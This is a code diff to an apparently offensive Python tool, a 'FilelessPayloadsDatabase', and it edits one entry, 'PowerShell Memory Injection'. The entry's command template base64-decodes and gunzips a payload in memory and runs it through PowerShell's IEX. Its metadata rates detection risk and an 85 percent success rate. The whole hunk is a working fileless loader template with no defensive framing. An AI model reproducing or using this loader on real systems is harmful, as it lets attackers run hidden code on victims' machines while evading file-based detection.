@@ -802,7 +802,7 @@ class FilelessPayloadsDatabase:
             name='PowerShell Memory Injection',
             technique='memory',
             description='Inject payload into memory via PowerShell',
-            command_template='powershell -nop -c "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('{b64}')); IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"',
+            command_template=f"powershell -nop -c \"$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('{b64}')); IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()\"",
             persistence=False,
             detection_risk='medium',
             success_rate=85,
